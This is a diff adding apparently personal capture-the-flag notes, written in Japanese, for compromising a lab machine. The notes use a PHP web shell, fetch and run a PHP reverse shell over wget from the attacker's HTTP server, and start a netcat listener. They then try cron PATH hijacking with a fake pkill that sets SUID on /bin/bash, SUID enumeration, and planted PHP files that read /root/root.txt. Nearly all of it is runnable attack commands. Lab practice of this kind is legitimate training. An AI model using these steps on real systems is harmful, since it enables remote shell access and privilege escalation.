@@ -1,0 +1,260 @@
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hh 18 http://10.49.177.177/cvs/shell.pdf.php?FUZZ=id
+
+# RCE: wget で reverse shell をダウンロード
+http://10.49.177.177/cvs/shell.pdf.php?cmd=wget http://192.168.141.239:8080/php-reverse-shell.php
+
+========================================
+Reverse Shell 取得手順
+========================================
+
+# ターミナル1: HTTPサーバー起動（php-reverse-shell.php があるディレクトリで）
+python3 -m http.server 8080
+
+# ターミナル2: リスナー起動
+nc -lvnp 1234
+
+# ターミナル3: ブラウザまたは curl でURLにアクセス
+# スペースを %20 にエスケープ
+curl "http://10.49.177.177/cvs/shell.pdf.php?cmd=wget%20http://192.168.141.239:8080/php-reverse-shell.php"
+
+# ターミナル3: ダウンロードされたシェルを実行
+curl "http://10.49.177.177/cvs/shell.pdf.php?cmd=php%20php-reverse-shell.php"
+
+# → nc にシェル接続が来る
+# その後：
+sudo -l
+find / -name "flag*" 2>/dev/null
+
+========================================
+Cron Exploit
+========================================
+# ディレクトリが read-only
+# pkill ファイル作成がPermission denied
+
+# writable ディレクトリに移動
+cd /tmp
+
+# pkill を作成
+echo "chmod +s /bin/bash" > pkill
+chmod +x pkill
+
+# cron が PATH から pkill を探すので、これが実行される
+# その後 bash -p で root になれる
+bash -p
+
+========================================
+実際の状況
+========================================
+# /home/lachlan/bin は read-only → pkill 作成不可
+# backup.sh が /home/lachlan/bin にある
+
+# backup.sh の内容確認
+cat /home/lachlan/bin/backup.sh
+
+# /tmp に pkill を作成（/home/lachlan/bin は即ダメなので）
+cd /tmp
+echo "chmod +s /bin/bash" > pkill
+chmod +x pkill
+
+# cron が実行される際に PATH に /tmp が含まれているか確認
+# または crontab -l でスケジュール確認
+crontab -l
+
+# cronが /home/lachlan/bin/backup.sh を実行している場合
+# backup.sh 内で相対パスで pkill を呼び出していれば
+# cd /home/lachlan/bin; /home/lachlan/bin/backup.sh の形で実行される
+# → /home/lachlan/bin/pkill が優先される（writable ではないので失敗）
+
+# 別案：backup.sh そのものが writable か確認
+ls -l /home/lachlan/bin/backup.sh
+
+# または $HOME/.local/bin/ など他の PATH が있는지 확認
+echo $PATH
+
+========================================
+Exploit 状況
+========================================
+# /tmp/pkill 作成後も /bin/bash に suid bit がつかない
+# → cron が実行されていない、または pkill が呼び出されていない
+
+# デバッグ：
+which pkill
+echo $PATH
+cat backup.sh
+
+# backup.sh が pkill をどう呼び出しているか確認
+# pkill が full path で呼び出されていなければ PATH exploit が使える
+
+# 別案：writable script に reverse shell を仕込む
+# cron が実行するスクリプトを探す
+find / -writable -name "*.sh" 2>/dev/null
+
+# または PATH に自分のディレクトリを優先する
+export PATH=/tmp:$PATH
+echo $PATH
+
+========================================
+実際のbackup.sh の内容
+========================================
+# backup.sh のコメント：# todo: pita website backup as requested by her majesty
+# → 内容がコメントだけなので、cronが実行されていない
+
+# 別のprivesc方法：
+sudo -l
+
+# SUID binary を探す
+find / -perm -4000 2>/dev/null
+
+# cron の状態確認
+ps aux | grep -i cron
+
+# /etc/crontab を確認
+cat /etc/crontab
+
+========================================
+/home/lachlan/bin は read-only
+========================================
+# /home/lachlan/bin に pkill を作成しようとしたが Permission denied
+# echo "chmod +s /bin/bash" > pkill → Permission denied
+
+# /tmp で作成済み（writable）
+cd /tmp
+ls -l pkill
+# -rwxrwxrwx 1 www-data www-data 19 Apr  2 14:06 pkill
+
+# user.txt を確認（flag候補）
+cat /home/lachlan/user.txt
+
+# privesc 方法を探す
+sudo -l
+
+# SUID binary
+find / -perm -4000 2>/dev/null
+
+========================================
+/root フラグ取得
+========================================
+# 現在のユーザー確認
+whoami
+
+# /root にアクセス権があるか確認
+ls -l /root
+cat /root/root.txt
+
+# 権限がない場合は privesc が必要
+sudo -l
+
+# SUID binary で privesc 可能か確認
+# find / -perm -4000 の結果から、exploitable な SUID を探す
+
+# よくあるprivesc：
+# - /usr/bin/sudo
+# - /usr/bin/find (writable ディレクトリがあれば可)
+# - /usr/bin/env
+# - ld.so.preload 経由
+
+# ls -la /root も確認
+ls -la /root
+
+========================================
+www-data は root 権限がない
+========================================
+# whoami: www-data
+# /root アクセス不可 → privesc が必須
+
+# step1: SUID binary を実行
+find / -perm -4000 2>/dev/null | head -20
+
+# step2: writable なファイル/ディレクトリを探す
+find / -writable -type f 2>/dev/null | grep -E "\.py|\.sh|\.c" | head -20
+
+# step3: backup.sh が writable か再確認
+ls -l /home/lachlan/bin/backup.sh
+
+# step4: /tmp/pkill がまだあるか確認（cronで実行されたか）
+ls -l /tmp/pkill
+ls -l /bin/bash | grep -E "^.*s.*"
+
+# step5: cron が実行されているか確認
+ps aux | grep -i cron
+ps aux | grep -i backup
+
+========================================
+SUID binary のリスト
+========================================
+/usr/bin/at ← scheduled jobs で privesc 可能かも
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+
+# at を使ってroot で command を実行
+echo "cat /root/root.txt > /tmp/root_flag.txt" | at now + 1 minute
+
+# 1分待った後
+cat /tmp/root_flag.txt
+
+# または at list で確認
+atq
+atp
+
+# writable な場所が /tmp と /var/www/html/dist しかないので
+# /tmp/root_flag.txt が候補
+
+========================================
+at コマンドは権限なし
+========================================
+# at が使えないので別の方法
+
+# step1: RCE シェルから直接 /root を読む方法
+# www-data では cat /root/root.txt は失敗する
+# しかし PHP コマンド実行で試す
+
+cd /var/www/html
+
+# PHP ファイルを作成（もしくは既存の .php を改造）
+echo '<?php system("cat /root/root.txt"); ?>' > test.php
+
+# ブラウザまたは curl でアクセス
+curl http://10.49.177.177/test.php
+
+# または
+cd /tmp
+cat > exploit.php << 'EOF'
+<?php
+$output = shell_exec("cat /root/root.txt");
+echo $output;
+?>
+EOF
+
+# /var/www/html にコピー
+cp exploit.php /var/www/html/
+
+# アクセス
+curl http://10.49.177.177/exploit.php
+
+========================================
+/etc/crontab 発見！
+========================================
+PATH=/home/lachlan/bin:/bin:/usr/bin
+
+# cron で pkill が相対パスで呼び出されている！
+# * * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+
+# PATH の先頭に /home/lachlan/bin があるので、
+# /home/lachlan/bin/pkill があれば、そちらが優先実行される
+
+# だが /home/lachlan/bin は www-data では writable でない
+
+# 別案：lachlan ユーザーで /home/lachlan/bin に書き込む
+# または su でlachlanになる
+su lachlan
+# パスワードが必要か試す
+
+# またはsudo sudoers を確認（すでに失敗）
+sudo -l -u lachlan
+
+# 最後の手段：PHP で直接 /root/root.txt を読む
+echo '<?php system("cat /root/root.txt; cat /etc/crontab"); ?>' > /var/www/html/flag.php
+curl http://10.49.177.177/flag.php
+
